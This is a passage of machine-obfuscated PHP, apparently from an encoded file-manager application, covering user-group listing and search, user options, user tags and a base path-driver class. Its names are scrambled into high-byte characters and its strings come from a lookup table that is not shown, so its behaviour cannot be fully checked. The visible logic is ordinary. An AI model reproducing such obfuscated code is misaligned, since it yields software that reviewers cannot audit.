userGroupRemove($ş¯Ô³ØÁ, $ò–Ï˜†®) { $ª™¶÷è¥ =& $_SERVER[íû‘ş´]; $ÏÂÔğûÖ = $this->getInfoSimple($ş¯Ô³ØÁ); if (!$ÏÂÔğûÖ || !$ò–Ï˜†®) { return !1; } $üµùŒäö = array($ª™¶÷è¥[1696] => $ş¯Ô³ØÁ, $ª™¶÷è¥[1991] => $ò–Ï˜†®); return Model($ª™¶÷è¥[1993])->where($üµùŒäö)->delete(); } public function listData() { $Ğ´¼—¾ = $this->_makeOrder()->selectPage(50); $this->_listDataApply($Ğ´¼—¾[$_SERVER[íû‘ş´][413]]); return $Ğ´¼—¾; } public function listByID($ÀÔÍÊØß) { $§Ü¼¡…‚ =& $_SERVER[íû‘ş´]; if (!$ÀÔÍÊØß) { return; } $şÀğôìá = array($§Ü¼¡…‚[1705] => array($§Ü¼¡…‚[7], $ÀÔÍÊØß)); $½ï¦Äê = $this->where($şÀğôìá)->select(); $½ï¦Äê = array_sort_keep($½ï¦Äê, $§Ü¼¡…‚[1705], $ÀÔÍÊØß); $this->_listDataApply($½ï¦Äê); return $½ï¦Äê; } public function listByGroup($¹ÆÀêé“ = 0, $äÅû¹İá = array()) { $çÆş—‚È =& $_SERVER[íû‘ş´]; $×Ì³…•Ï = $çÆş—‚È[12]; $ûş•÷æé = array(); if ($¹ÆÀêé“) { $ûş•÷æé = array($çÆş—‚È[2391] => intval($¹ÆÀêé“)); $×Ì³…•Ï = "\114\x45\x46\124\x20\x4a\x4f\x49\116\x20{$this->tablePrefix}\165\x73\x65\162\x5f\147\x72\157\x75\160\x20\165\163\145\x72\137\x67\162\x6f\165\160\x20\157\x6e\x20\165\163\145\x72\56\x75\163\145\x72\111\104\40\x3d\40\165\163\x65\x72\137\147\162\x6f\x75\x70\56\165\x73\145\162\111\x44"; $ŸŸ·ãè” = Input::get($çÆş—‚È[507], null, $çÆş—‚È[12]) ? $çÆş—‚È[12] : $çÆş—‚È[2392]; } if (isset($äÅû¹İá[$çÆş—‚È[809]])) { $ûş•÷æé[$çÆş—‚È[2393]] = $äÅû¹İá[$çÆş—‚È[809]]; } $¥˜„° = $this->_makeOrder($ŸŸ·ãè”)->field($çÆş—‚È[2394])->where($ûş•÷æé)->join($×Ì³…•Ï)->selectPage(50); $this->_listDataApply($¥˜„°[$çÆş—‚È[413]]); return $¥˜„°; } private function _makeOrder($±è¿Ë¡ = '') { $†º€Øúã =& $_SERVER[íû‘ş´]; $è¢ß˜½¯ = array($†º€Øúã[1705], $†º€Øúã[32], $†º€Øúã[1892], $†º€Øúã[1864], $†º€Øúã[215]); $«à½õ–€ = array($†º€Øúã[500] => $†º€Øúã[501], $†º€Øúã[502] => $†º€Øúã[503]); $àÛÆä¦ = Input::get($†º€Øúã[507], $†º€Øúã[7], $†º€Øúã[1696], $è¢ß˜½¯); $á£¡±¯Ï = Input::get($†º€Øúã[508], $†º€Øúã[7], $†º€Øúã[1994], array($†º€Øúã[1994], $†º€Øúã[502])); $á£¡±¯Ï = $«à½õ–€[$á£¡±¯Ï]; $±è¿Ë¡ = $±è¿Ë¡ . "\165\x73\x65\162\56{$àÛÆä¦}\x20{$á£¡±¯Ï}\54\x20\x75\x73\145\162\x2e\165\x73\145\162\111\x44\x20\x61\163\x63"; return $this->alias($†º€Øúã[2120])->order($±è¿Ë¡); } public function listSearch($Ííîòğ·) { $¯ÚÜĞ“û =& $_SERVER[íû‘ş´]; $®›íÛ²½ = $Ííîòğ·[$¯ÚÜĞ“û[1997]]; $ıêí²é³ = isset($Ííîòğ·[$¯ÚÜĞ“û[1998]]) ? $Ííîòğ·[$¯ÚÜĞ“û[1998]] : !1; $®›íÛ²½ = str_replace($¯ÚÜĞ“û[1999], $¯ÚÜĞ“û[2000], trim($®›íÛ²½)); $®Êú›¡ª = array($¯ÚÜĞ“û[32] => array($¯ÚÜĞ“û[427], "\45{$®›íÛ²½}\45"), $¯ÚÜĞ“û[349] => array($¯ÚÜĞ“û[427], "{$®›íÛ²½}\45"), $¯ÚÜĞ“û[2185] => array($¯ÚÜĞ“û[427], "{$®›íÛ²½}\45"), $¯ÚÜĞ“û[1058] => $¯ÚÜĞ“û[2001]); if (Input::check($®›íÛ²½, $¯ÚÜĞ“û[355])) { $®Êú›¡ª[$¯ÚÜĞ“û[1705]] = array($¯ÚÜĞ“û[427], "{$®›íÛ²½}\45"); $®Êú›¡ª[$¯ÚÜĞ“û[2376]] = array($¯ÚÜĞ“û[427], "{$®›íÛ²½}\x25"); } if (!$®›íÛ²½) { $®Êú›¡ª = array(); } if (isset($Ííîòğ·[$¯ÚÜĞ“û[809]])) { $®Êú›¡ª[$¯ÚÜĞ“û[809]] = $Ííîòğ·[$¯ÚÜĞ“û[809]]; } $®Êú›¡ª = $this->parseWhereLike($®Êú›¡ª); $„ÂŠ¢üŒ = $this->_makeOrder()->where($®Êú›¡ª)->selectPage(20); if (!$„ÂŠ¢üŒ || count($„ÂŠ¢üŒ[$¯ÚÜĞ“û[413]]) < 5 && Input::check($®›íÛ²½, $¯ÚÜĞ“û[362])) { $Í¯¦Ïµ = $this->_searchFromMeta($¯ÚÜĞ“û[514], $®›íÛ²½, 10); $ÂİİßÇè = $this->_searchFromMeta($¯ÚÜĞ“û[515], $®›íÛ²½, 10); $Õ·³ÛÓØ = array_merge($Í¯¦Ïµ, $ÂİİßÇè, $„ÂŠ¢üŒ[$¯ÚÜĞ“û[413]]); $„ÂŠ¢üŒ[$¯ÚÜĞ“û[413]] = array_unique_by_key($Õ·³ÛÓØ, $¯ÚÜĞ“û[1705]); $„ÂŠ¢üŒ[$¯ÚÜĞ“û[410]][$¯ÚÜĞ“û[411]] = count($„ÂŠ¢üŒ[$¯ÚÜĞ“û[413]]); $„ÂŠ¢üŒ[$¯ÚÜĞ“û[410]][$¯ÚÜĞ“û[412]] = ceil($„ÂŠ¢üŒ[$¯ÚÜĞ“û[410]][$¯ÚÜĞ“û[411]] / $„ÂŠ¢üŒ[$¯ÚÜĞ“û[410]][$¯ÚÜĞ“û[407]]); } $this->_listDataApply($„ÂŠ¢üŒ[$¯ÚÜĞ“û[413]]); $this->_filterByGroup($„ÂŠ¢üŒ, $ıêí²é³); return $„ÂŠ¢üŒ; } private function _filterByGroup(&$Æ×áè, $Ñ¸°ªÈ÷) { $·Åùºí =& $_SERVER[íû‘ş´]; if (!$Ñ¸°ªÈ÷) { return $Æ×áè; } foreach ($Æ×áè[$·Åùºí[413]] as $á¡ñš™¯ => &$ãş®ÈíĞ) { $³ôÒíâœ = array_to_keyvalue($ãş®ÈíĞ[$·Åùºí[2090]], $·Åùºí[12], $·Åùºí[1903]); if (!in_array($Ñ¸°ªÈ÷, $³ôÒíâœ)) { unset($Æ×áè[$·Åùºí[413]][$á¡ñš™¯]); } } unset($ãş®ÈíĞ); $Æ×áè[$·Åùºí[413]] = array_values($Æ×áè[$·Åùºí[413]]); $Æ×áè[$·Åùºí[410]] = array($·Åùºí[2155] => count($Æ×áè[$·Åùºí[413]]), $·Åùºí[2153] => $Æ×áè[$·Åùºí[410]][$·Åùºí[407]], $·Åùºí[2152] => 1, $·Åùºí[2154] => 1); } private function _searchFromMeta($Ö…£°Ù´, $×Ä’ıªÍ, $û÷Ğß‘ø) { $Ë¾ù†±® =& $_SERVER[íû‘ş´]; $×Ä’ıªÍ = strtolower($×Ä’ıªÍ); $£Ú¹ü½ = array($Ë¾ù†±®[94] => $Ö…£°Ù´, $Ë¾ù†±®[418] => array($Ë¾ù†±®[427], "\45{$×Ä’ıªÍ}\45")); $£Ú¹ü½ = $this->parseWhereLike($£Ú¹ü½); $†º“âïõ = Model($Ë¾ù†±®[2395])->where($£Ú¹ü½)->limit($û÷Ğß‘ø)->select(); if (!$†º“âïõ) { return array(); } $†º“âïõ = array_to_keyvalue($†º“âïõ, $Ë¾ù†±®[12], $Ë¾ù†±®[1705]); $€ş¹îÅ´ = $this->where(array($Ë¾ù†±®[1696] => array($Ë¾ù†±®[7], $†º“âïõ)))->select(); if (!$€ş¹îÅ´) { return array(); } return $€ş¹îÅ´; } private function _listDataApplyItem($ˆşù”¨É) { $©îŒĞ–¦ = array($ˆşù”¨É); $this->_listDataApply($©îŒĞ–¦); return $©îŒĞ–¦[0]; } private function _listDataApply(&$Ùäñ…) { $à‚»ôÏ =& $_SERVER[íû‘ş´]; if (!$Ùäñ…) { return; } array_remove_key($Ùäñ…, $à‚»ôÏ[947]); $Ïº”’çü = array_to_keyvalue($Ùäñ…, $à‚»ôÏ[12], $à‚»ôÏ[1705]); $this->_listAppendGroup($Ùäñ…, $Ïº”’çü); $this->_listAppendMeta($Ùäñ…, $Ïº”’çü); $this->_listAppendSourceRoot($Ùäñ…, $Ïº”’çü); } private function _listAppendSourceRoot(&$‡ƒ°©ìĞ, $²Û¨áöÅ) { $ˆÊğëû =& $_SERVER[íû‘ş´]; $ÁõºËõî = Model($ˆÊğëû[884])->listSourceRoot(SourceModel::TYPE_USER, $²Û¨áöÅ); $ÁõºËõî = array_to_keyvalue($ÁõºËõî, $ˆÊğëû[548]); $ÁõºËõî = array_remove_key($ÁõºËõî, $ˆÊğëû[548]); foreach ($‡ƒ°©ìĞ as &$ş®ßÇØ) { $ş®ßÇØ[$ˆÊğëû[87]] = $ÁõºËõî[$ş®ßÇØ[$ˆÊğëû[1705]]] ? $ÁõºËõî[$ş®ßÇØ[$ˆÊğëû[1705]]] : array(); } unset($ş®ßÇØ); } private function _listAppendGroup(&$ÏºĞú®¦, $©Ì¤Á©³) { $¸Üçëï =& $_SERVER[íû‘ş´]; $ƒ÷ı°¿ = array($¸Üçëï[1705] => array($¸Üçëï[7], $©Ì¤Á©³)); $¥¾¾ÂĞ = Model($¸Üçëï[1993])->where($ƒ÷ı°¿)->select(); $Í»Òó” = array_to_keyvalue($¥¾¾ÂĞ, $¸Üçëï[12], $¸Üçëï[1903]); $Í»Òó” = array_remove_value(array_unique($Í»Òó”), $¸Üçëï[212]); if (!$Í»Òó” || !$¥¾¾ÂĞ) { return; } $ƒ÷ı°¿ = array($¸Üçëï[1903] => array($¸Üçëï[7], $Í»Òó”)); $¢Ï¿¡Åı = Model($¸Üçëï[2088])->field($¸Üçëï[2396])->where($ƒ÷ı°¿)->select(); $¢Ï¿¡Åı = array_to_keyvalue($¢Ï¿¡Åı, $¸Üçëï[1903]); $¥¾¾ÂĞ = array_to_keyvalue_group($¥¾¾ÂĞ, $¸Üçëï[1705]); foreach ($¥¾¾ÂĞ as &$š¢…«²à) { $ğ‹ÕĞßû = array(); foreach ($š¢…«²à as $”­òİû˜) { if (!$”­òİû˜[$¸Üçëï[2007]]) { continue; } $¸‘¡Ì‚Æ = Model($¸Üçëï[550])->listData($”­òİû˜[$¸Üçëï[2007]]); $ğ‹ÕĞßû[] = array($¸Üçëï[1903] => $”­òİû˜[$¸Üçëï[1903]], $¸Üçëï[2397] => $¢Ï¿¡Åı[$”­òİû˜[$¸Üçëï[1903]]][$¸Üçëï[32]], $¸Üçëï[563] => $¢Ï¿¡Åı[$”­òİû˜[$¸Üçëï[1903]]][$¸Üçëï[563]], $¸Üçëï[464] => $¸‘¡Ì‚Æ); } $š¢…«²à = $ğ‹ÕĞßû; } unset($š¢…«²à); foreach ($ÏºĞú®¦ as &$±áôºÌ£) { $±áôºÌ£[$¸Üçëï[2090]] = array(); if (isset($¥¾¾ÂĞ[$±áôºÌ£[$¸Üçëï[1705]]])) { $±áôºÌ£[$¸Üçëï[2090]] = $¥¾¾ÂĞ[$±áôºÌ£[$¸Üçëï[1705]]]; } } unset($±áôºÌ£); } public function userAppendGroup($ùÂÉäëù) { $¡ÛÄê¾Æ =& $_SERVER[íû‘ş´]; if (!$ùÂÉäëù) { return array(); } $this->_listAppendGroup($ùÂÉäëù, array_to_keyvalue($ùÂÉäëù, $¡ÛÄê¾Æ[12], $¡ÛÄê¾Æ[1705])); return $ùÂÉäëù; } private function _listAppendMeta(&$¼³×ª“è, $ĞÙåìó) { $­ŞòÌµË =& $_SERVER[íû‘ş´]; $ú«Ôƒ£ø = UserJobModel::JOB_KEY; $£Óæïãğ = array($­ŞòÌµË[2377]); $ºïœ·¸ø = array($­ŞòÌµË[1705] => array($­ŞòÌµË[7], $ĞÙåìó)); $É»ƒŞØ = Model($­ŞòÌµË[2375])->where($ºïœ·¸ø)->select(); $É»ƒŞØ = array_to_keyvalue_group($É»ƒŞØ, $­ŞòÌµË[1705]); foreach ($É»ƒŞØ as &$Š†Â¢±·) { $ßŒó¤¯ = array(); foreach ($Š†Â¢±· as $ÎÔÆ¹Š½) { if (!in_array($ÎÔÆ¹Š½[$­ŞòÌµË[94]], $£Óæïãğ)) { $ßŒó¤¯[$ÎÔÆ¹Š½[$­ŞòÌµË[94]]] = $ÎÔÆ¹Š½[$­ŞòÌµË[418]]; } } $Š†Â¢±· = $ßŒó¤¯; } unset($Š†Â¢±·); $ıŒæ¼×— = Model($­ŞòÌµË[2398]); foreach ($¼³×ª“è as &$ğ¿Œ¦³ñ) { $ÃµˆÖ = array(); if (isset($É»ƒŞØ[$ğ¿Œ¦³ñ[$­ŞòÌµË[1705]]])) { $ÃµˆÖ = $É»ƒŞØ[$ğ¿Œ¦³ñ[$­ŞòÌµË[1705]]]; } $ğ¿Œ¦³ñ[$­ŞòÌµË[2399]] = array(); if (isset($ÃµˆÖ[$ú«Ôƒ£ø])) { $ğ¿Œ¦³ñ[$­ŞòÌµË[2399]] = $ıŒæ¼×—->getUserJobInfo($ÃµˆÖ[$ú«Ôƒ£ø]); } } unset($ğ¿Œ¦³ñ); } protected function groupUserAll($¢©ÍŠŞƒ) { $ê¼Ï’¥€ =& $_SERVER[íû‘ş´]; if (!$¢©ÍŠŞƒ) { return !1; } $ÂŠˆûé¥ = Model($ê¼Ï’¥€[1993])->field($ê¼Ï’¥€[1705])->where(array($ê¼Ï’¥€[1903] => array($ê¼Ï’¥€[7], $¢©ÍŠŞƒ)))->select(); $ÂŠˆûé¥ = array_to_keyvalue($ÂŠˆûé¥, $ê¼Ï’¥€[12], $ê¼Ï’¥€[1705]); return array_unique($ÂŠˆûé¥); } public function userSearch($áù¨€øÙ, $Ç»¹—­í = "\x2a") { return Model($_SERVER[íû‘ş´][577])->where($áù¨€øÙ)->field($Ç»¹—­í)->find(); } } class UserOptionModel extends ModelBaseOption { protected $tableName = "\165\163\145\162\x5f\157\x70\164\x69\157\156"; protected $jsonField = array(); function __construct() { parent::__construct(); } protected function cacheKey($ÃÍ—ü¹‰) { $ãŞƒëà¬ =& $_SERVER[íû‘ş´]; $ª˜ûÊ¶¼ = defined($ãŞƒëà¬[2124]) && USER_ID ? USER_ID : $ãŞƒëà¬[12]; return "\125\163\x65\162\x4f\160\164\151\x6f\x6e\137{$ÃÍ—ü¹‰}\x5f" . $ª˜ûÊ¶¼; } protected function filterWhere($Ê’¤¹€Ø) { $·ÒŠÆ® =& $_SERVER[íû‘ş´]; $Ê’¤¹€Ø[$·ÒŠÆ®[1705]] = defined($·ÒŠÆ®[2124]) && USER_ID ? USER_ID : $·ÒŠÆ®[12]; return $Ê’¤¹€Ø; } public function cacheRemoveUser($ÙĞ×‰ıç, $°¬Šõ˜) { return Cache::remove("\125\x73\x65\162\x4f\x70\164\x69\157\156\137{$ÙĞ×‰ıç}\137" . $°¬Šõ˜); } protected function optionDefault($¹ÍüÄË¯ = '') { $Ğëõ°ãŸ =& $_SERVER[íû‘ş´]; if ($¹ÍüÄË¯ == $Ğëõ°ãŸ[12]) { return $GLOBALS[$Ğëõ°ãŸ[6]][$Ğëõ°ãŸ[2400]]; } if ($¹ÍüÄË¯ == $Ğëõ°ãŸ[2401]) { return $GLOBALS[$Ğëõ°ãŸ[6]][$Ğëõ°ãŸ[2402]]; } } } class UserTagModel extends ModelBaseLight { public $optionType = "\x55\x73\145\x72\x2e\164\x61\147\x4c\x69\163\x74"; public $modelType = "\125\x73\145\162\x4f\x70\x74\x69\x6f\156"; public $field = array("\x6e\141\x6d\x65", "\163\164\x79\x6c\x65", "\x73\157\x72\164"); public function listData($Â¨Ö  = false, $‡¼¯—˜‘ = "\163\x6f\162\164", $ùèìİ’¾ = false) { return parent::listData($Â¨Ö , $‡¼¯—˜‘, $ùèìİ’¾); } public function remove($•ÕœÇ«†) { return parent::remove($•ÕœÇ«†); } public function add($Œ¶‹, $«ƒñ€‘ = "\154\141\x62\145\154\55\147\x72\x65\171\x2d\156\x6f\162\x6d\x61\x6c") { $¢ßüÇ‰ =& $_SERVER[íû‘ş´]; if ($this->findByName($Œ¶‹)) { return !1; } $›¦—½†” = array($¢ßüÇ‰[471] => $Œ¶‹, $¢ßüÇ‰[536] => $«ƒñ€‘, $¢ßüÇ‰[1907] => $this->getSort($¢ßüÇ‰[302]) + 1); return parent::insert($›¦—½†”); } public function update($’çòºêğ, $«Å²à·Ï) { $ıí—ğõ =& $_SERVER[íû‘ş´]; $¾Ã¶Ç†Û = $this->listData($’çòºêğ); $ƒŸÒüß÷ = $this->findByName($«Å²à·Ï[$ıí—ğõ[32]]); if (!$¾Ã¶Ç†Û || $ƒŸÒüß÷ && $ƒŸÒüß÷[$ıí—ğõ[443]] != $¾Ã¶Ç†Û[$ıí—ğõ[443]]) { return !1; } return parent::update($’çòºêğ, $«Å²à·Ï); } public function moveTop($Í´Â”ıà) { $Ñ°ë Æ« =& $_SERVER[íû‘ş´]; $ŒÅ¡Û™Ë = parent::listData(); $¢ö±†µÌ = $this->getSort($Ñ°ë Æ«[301]); foreach ($ŒÅ¡Û™Ë as &$¤ôÊœ¸û) { if ($¤ôÊœ¸û[$Ñ°ë Æ«[443]] == $Í´Â”ıà) { $¤ôÊœ¸û[$Ñ°ë Æ«[1927]] = $¢ö±†µÌ; continue; } $¤ôÊœ¸û[$Ñ°ë Æ«[1927]] += 1; } unset($¤ôÊœ¸û); return parent::resetData($ŒÅ¡Û™Ë); } public function moveBottom($óô£¬ú) { $§–úÃîÀ =& $_SERVER[íû‘ş´]; $¦èŸÊ = $this->getSort($§–úÃîÀ[302]) + 1; return parent::update($óô£¬ú, array($§–úÃîÀ[1927] => $¦èŸÊ)); } public function resetSort($øÑÀÃ¹‘) { $ËÃ¦ôÆ“ =& $_SERVER[íû‘ş´]; $øíÁ…Ûç = array(); $øÑÀÃ¹‘ = is_array($øÑÀÃ¹‘) ? $øÑÀÃ¹‘ : array(); for ($ø½·å¥á = 0; $ø½·å¥á < count($øÑÀÃ¹‘); $ø½·å¥á++) { $øíÁ…Ûç[$øÑÀÃ¹‘[$ø½·å¥á] . $ËÃ¦ôÆ“[12]] = $ø½·å¥á + 1; } $ÌÀ­Ü‡ = parent::listData(); foreach ($ÌÀ­Ü‡ as &$ÅÒ˜óÊü) { $â‡€Ç‚Ä = $øíÁ…Ûç[$ÅÒ˜óÊü[$ËÃ¦ôÆ“[443]]]; $ÅÒ˜óÊü[$ËÃ¦ôÆ“[1927]] = $â‡€Ç‚Ä ? $â‡€Ç‚Ä : $ÅÒ˜óÊü[$ËÃ¦ôÆ“[1927]]; } unset($ÅÒ˜óÊü); return parent::resetData($ÌÀ­Ü‡); } private function getSort($À¦îò®×) { $ıäÇÉÚ— =& $_SERVER[íû‘ş´]; $üÈ±Îª = parent::listData(); $¶×˜ŠØ = array_to_keyvalue($üÈ±Îª, $ıäÇÉÚ—[12], $ıäÇÉÚ—[1927]); if (!$¶×˜ŠØ) { $¶×˜ŠØ = array(0); } $Áœ¢±ß® = $À¦îò®× == $ıäÇÉÚ—[302] ? max($¶×˜ŠØ) : min($¶×˜ŠØ); return intval($Áœ¢±ß®); } } goto a×ğº¨èÊ¦; B„¦·ÉÎäŒ: class PathDriverBase { public $pathDriver = ''; public $pathBase = ''; public $path = ''; public $pathID = ''; public $_data = array(); public function __construct() { $”†İÂ¥â =& $_SERVER[íû‘ş´]; $this->objectDriver = array($”†İÂ¥â[60], $”†İÂ¥â[61], $”†İÂ¥â[62], $”†İÂ¥â[63], $”†İÂ¥â[64], $”†İÂ¥â[65], $”†İÂ¥â[66], $”†İÂ¥â[67], $”†İÂ¥â[68]); $this->_classObjectID = mt_rand(0, 10000); } public function getPath($Üœå–¬¶) { if (in_array($this->getType(), $this->objectDriver)) { return ltrim($Üœå–¬¶, $_SERVER[íû‘ş´][8]); } return $Üœå–¬¶; } public function iconvApp($íÔ½Îò ) { return $íÔ½Îò ; } public function iconvSystem($å¢øÇÔˆ) { return $å¢øÇÔˆ; } public function iconvTo($¨¹òÛ£, $šä®óÇ¸, $É¹èÚÄ) { $«¤ÖĞô =& $_SERVER[íû‘ş´]; if (!$¨¹òÛ£ || !function_exists($«¤ÖĞô[69])) { return $¨¹òÛ£; } static $üµµ±¿ = array(); $°ÌÂƒ¼‡ = $šä®óÇ¸ . $«¤ÖĞô[70] . $É¹èÚÄ . $«¤ÖĞô[71] . $¨¹òÛ£; if (isset($üµµ±¿[$°ÌÂƒ¼‡])) { return $üµµ±¿[$°ÌÂƒ¼‡]; } if (function_exists($«¤ÖĞô[72])) { $ü¸óêÏ = @mb_convert_encoding($¨¹òÛ£, $É¹èÚÄ, $šä®óÇ¸); } else { $ü¸óêÏ = @iconv($šä®óÇ¸, $É¹èÚÄ, $¨¹òÛ£); } $ü¸óêÏ = $ü¸óêÏ ? $ü¸óêÏ : $¨¹òÛ£; if (strstr($ü¸óêÏ, $«¤ÖĞô[73])) { $ü¸óêÏ = str_replace($«¤ÖĞô[73], $«¤ÖĞô[11], $ü¸óêÏ); } $üµµ±¿[$šä®óÇ¸ . $«¤ÖĞô[70] . $É¹èÚÄ . $«¤ÖĞô[71] . $¨¹òÛ£] = $ü¸óêÏ; $üµµ±¿[$É¹èÚÄ . $«¤ÖĞô[70] . $šä®óÇ¸ . $«¤ÖĞô[71] . $¨¹òÛ£] = $¨¹òÛ£; $üµµ±¿[$É¹èÚÄ . $«¤ÖĞô[70] . $šä®óÇ¸ . $«¤ÖĞô[71] . $ü¸óêÏ] = $¨¹òÛ£; $üµµ±¿[$šä®óÇ¸ . $«¤ÖĞô[70] . $É¹èÚÄ . $«¤ÖĞô[71] . $ü¸óêÏ] = $ü¸óêÏ; return $ü¸óêÏ; } public function getPathInner($ù…Û‚) { $ïŸŸ = IO::init($ù…Û‚); return $ïŸŸ->path; } public function getPathOuter($ÏÀ’…Şé) { $—š÷©ı =& $_SERVER[íû‘ş´]; $Ö Ïİû = strlen(trim($this->pathBase, $—š÷©ı[8])); $ÏÀ’…Şé = substr(trim($ÏÀ’…Şé, $—š÷©ı[8]), $Ö Ïİû); return $this->pathDriver . $—š÷©ı[8] . ltrim($ÏÀ’…Şé, $—š÷©ı[8]); } public function isParentOf($ï­Ûë¯·, $±Ï¾Ô³Ê) { $Ö®›¬Ñ› =& $_SERVER[íû‘ş´]; $ï­Ûë¯· = rtrim(strtolower($ï­Ûë¯·), $Ö®›¬Ñ›[8]) . $Ö®›¬Ñ›[8]; $±Ï¾Ô³Ê = rtrim(strtolower($±Ï¾Ô³Ê), $Ö®›¬Ñ›[8]) . $Ö®›¬Ñ›[8]; $À¶¯é–Œ = strpos($±Ï¾Ô³Ê, $ï­Ûë¯·) === 0; return $À¶¯é–Œ; } public function getType() { $¶¼”è™š =& $_SERVER[íû‘ş´]; $‘İù¹™¿ = str_replace($¶¼”è™š[74], $¶¼”è™š[12], get_class($this)); return strtolower($‘İù¹™¿); } public function isTypeObject() { if (!is_array($this->objectDriver)) { return !1; } return in_array($this->getType(), $this->objectDriver); } public function fileNameExist($ª”‹ìŸÎ, $ĞĞç¢”÷) { $«Š•Ó — =& $_SERVER[íû‘ş´]; $’ùïÂ¤ä = rtrim($ª”‹ìŸÎ, $«Š•Ó —[8]) . $«Š•Ó —[8] . $ĞĞç¢”÷; $ÚÖüÙÀ = $this->exist($’ùïÂ¤ä); return $ÚÖüÙÀ ? $’ùïÂ¤ä : !1; } public function setModifyTime($šÏ‚ãŠ, $éÎµ¨ß„ = '') { } public function renameObject($“Î„ÎÀ©, $¡é«—‰) { $ôñœÚƒƒ = $¡é«—‰; $“Î„ÎÀ© = $this->getPathOuter($“Î„ÎÀ©); $¡é«—‰ = $this->pathFather($“Î„ÎÀ©) . $¡é«—‰; $Ø×‡å–Å = IO::copy($“Î„ÎÀ©, $this->pathFather($“Î„ÎÀ©), REPEAT_RENAME_FOLDER, $ôñœÚƒƒ); if ($Ø×‡å–Å) { IO::remove($“Î„ÎÀ©); } return $Ø×‡å–Å ? $¡é«—‰ : !1; } public function tempFile($¸ÏÔÃ¡û = '', $ø×Ğé¨Î = '') { if (!$¸ÏÔÃ¡û) { $¸ÏÔÃ¡û = rand_string(15); } $üÍÂ¥¯ = TEMP_FILES . rand_string(15) . $_SERVER[íû‘ş´][8]; @mkdir($üÍÂ¥¯, DEFAULT_PERRMISSIONS, !0); $òõÆ†üş = $üÍÂ¥¯ . $¸ÏÔÃ¡û; @touch($òõÆ†üş); if ($ø×Ğé¨Î) { file_put_contents($òõÆ†üş, $ø×Ğé¨Î); } return $òõÆ†üş; } public function tempFileRemve($×âõ«©Å) { @unlink($×âõ«©Å); @rmdir($this->pathFather($×âõ«©Å)); } public function mkfile($¸Îéíä², $Àªœ´úÉ = '', $§½¾—ûê = REPEAT_RENAME) { } public function mkdir($¨Ó¨±Ìˆ, $—ŸóŠ…Ù = REPEAT_SKIP) { } public function delFile($ÉÎÁŠ¯ö) { } public function delFolder($¯½ûÚÙ¶) { } public function copyFile($Î² Ÿ‚İ, $¾“¸â³û) { } public function moveFile($ÈéÒÒœÙ, $È«ÁòöŠ) { } public function remove($ø²ò½÷Õ) { if ($this->isFile($ø²ò½÷Õ)) { return $this->delFile($ø²ò½÷Õ); } return $this->delFolder($ø²ò½÷Õ); } public function rename($ÂÀ¨„¨¦, $ÎÕºÃ´ê) { } public function exist($‚ÀïµîÆ) { } public function findByHash($àÁ…Šï = '', $´²å¤¹× = '') { return !1; } public function isFile($£É¡Úù…) { } public function isFolder($ìä¼Ûóğ) { } public function size($ş¼½¨×) { } public function info($•ˆ¿ù·) { } public function infoSimple($…¤ìÊ‰™) { return $this->info($…¤ìÊ‰™); } public function infoAuth($Ø¡÷Ê¼) { return $this->info($Ø¡÷Ê¼); } public function infoFull($©†™óû—) { return $this->info($©†™óû—); } public function infoFullSimple($ÙÇÁÏ¦) { return $this->info($ÙÇÁÏ¦); } public function infoWithChildren($†ÇóÊ¯¯) { $Çúåè—Ù =& $_SERVER[íû‘ş´]; static $øÆ›’¼Ì = array(); if (isset($øÆ›’¼Ì[$†ÇóÊ¯¯])) { return $øÆ›’¼Ì[$†ÇóÊ¯¯]; } $…‘‘ æÖ = $this->info($†ÇóÊ¯¯); if ($…‘‘ æÖ && $…‘‘ æÖ[$Çúåè—Ù[33]] == $Çúåè—Ù[75]) { $›±ášŸ¿ = array($Çúåè—Ù[76] => 0, $Çúåè—Ù[77] => 0, $Çúåè—Ù[78] => 0); $this->infoChildren($†ÇóÊ¯¯, $›±ášŸ¿); $…‘‘ æÖ[$Çúåè—Ù[76]] = $›±ášŸ¿[$Çúåè—Ù[76]]; $…‘‘ æÖ[$Çúåè—Ù[79]] = array($Çúåè—Ù[80] => $›±ášŸ¿[$Çúåè—Ù[77]], $Çúåè—Ù[81] => $›±ášŸ¿[$Çúåè—Ù[78]]); $øÆ›’¼Ì[$†ÇóÊ¯¯] = $…‘‘ æÖ; } return $…‘‘ æÖ; } public function listPath($æ¾ÎÀŸ, $Û†Î‰æ‰ = false) { } public function has($÷ì”ƒŒ, $­ûïÕ‰ = false, $‰ò¨òÓà = false) { } public function canRead($§øŞÀ‘Ö) { } public function canWrite($¡ª®½°) { } public function getContent($‰Ç“¸À³) { } public function setContent($ì¼ÊÛÃ¾, $âòÓüü = '') { } protected function infoChildren($‹…´‡½”, &$ÌÛŞõ‚Ó) { $Ô†ÇõğÂ =& $_SERVER[íû‘ş´]; check_abort_echo(); $€§èŸÈ = $this->listPath($‹…´‡½”, !0); $€§èŸÈ = array_merge($€§èŸÈ[$Ô†ÇõğÂ[82]], $€§èŸÈ[$Ô†ÇõğÂ[83]]); foreach ($€§èŸÈ as $éïá‚¾) { if ($éïá‚¾[$Ô†ÇõğÂ[33]] == $Ô†ÇõğÂ[75]) { $ÌÛŞõ‚Ó[$Ô†ÇõğÂ[78]]++; $×»Ï¼£½ = $this->getPathInner($éïá‚¾[$Ô†ÇõğÂ[84]]); $this->infoChildren($×»Ï¼£½, $ÌÛŞõ‚Ó); } else { $ÌÛŞõ‚Ó[$Ô†ÇõğÂ[77]]++; $ÌÛŞõ‚Ó[$Ô†ÇõğÂ[76]] += $éïá‚¾[$Ô†ÇõğÂ[76]]; } } } public function fileSubstr($í×Ù, $ÉÈÄóÈ¶, $¡ÉÕÛÕ) { } public function listAll($í³ãé¹é) { } public function listAllMake($·šÎ£áä, &$µ€åşŒ) { $Ì´æÏÆÛ =& $_SERVER[íû‘ş´]; check_abort_echo(); $íÉ¸ç = $this->listPath($·šÎ£áä, !0); if (!$íÉ¸ç) { return; } $ª–ğıé = array_merge($íÉ¸ç[$Ì´æÏÆÛ[82]], $íÉ¸ç[$Ì´æÏÆÛ[83]]); foreach ($ª–ğıé as $¹´§Ú’‚) { $€œºù¤Í = $¹´§Ú’‚[$Ì´æÏÆÛ[33]] == $Ì´æÏÆÛ[75]; $ëñÂíğü = array($Ì´æÏÆÛ[84] => $¹´§Ú’‚[$Ì´æÏÆÛ[84]], $Ì´æÏÆÛ[75] => $€œºù¤Í); if (isset($¹´§Ú’‚[$Ì´æÏÆÛ[76]])) { $ëñÂíğü[$Ì´æÏÆÛ[76]] = $¹´§Ú’‚[$Ì´æÏÆÛ[76]]; } if (isset($¹´§Ú’‚[$Ì´æÏÆÛ[85]])) { 